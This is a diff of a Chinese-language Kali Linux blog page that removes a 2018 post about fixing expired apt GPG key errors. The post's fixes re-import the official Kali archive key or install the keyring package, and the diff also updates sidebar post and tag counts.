-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-06T12:17:06+08:00">2018-02-06</time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="更换apt源后显示GPG错误-签名无效等"><a href="#更换apt源后显示GPG错误-签名无效等" class="headerlink" title="更换apt源后显示GPG错误 签名无效等"></a>更换apt源后显示GPG错误 签名无效等</h3><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!<img src="https://s1.ax2x.com/2018/02/06/vQvfJ.png" alt=""></p>
-<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>具体更新方法有以下几种方法：（任选一种即可）</p>
-<pre><code>1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6
-</code></pre><hr>
-<pre><code>2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add
-</code></pre><hr>
-<pre><code>3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6
-# gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add -
-</code></pre><hr>
-<pre><code>4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb
-# apt install ./kali-archive-keyring_2018.1_all.deb
-</code></pre><p>成功更新密钥之后，我们就可以正常的 update / upgrade 了。</p>
-<p>然后在执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p>
-<p>即可。<br><img src="https://s1.ax2x.com/2018/02/06/vQhal.png" alt="解决"></p>
 
           
         
@@ -1806,7 +1909,7 @@ wlan0mon 启用监听模式的网卡名
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1828,7 +1931,7 @@ wlan0mon 启用监听模式的网卡名
                 
                 <div class="site-state-item site-state-tags">
                   <a href="/tags/index.html">
-                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-count">4</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
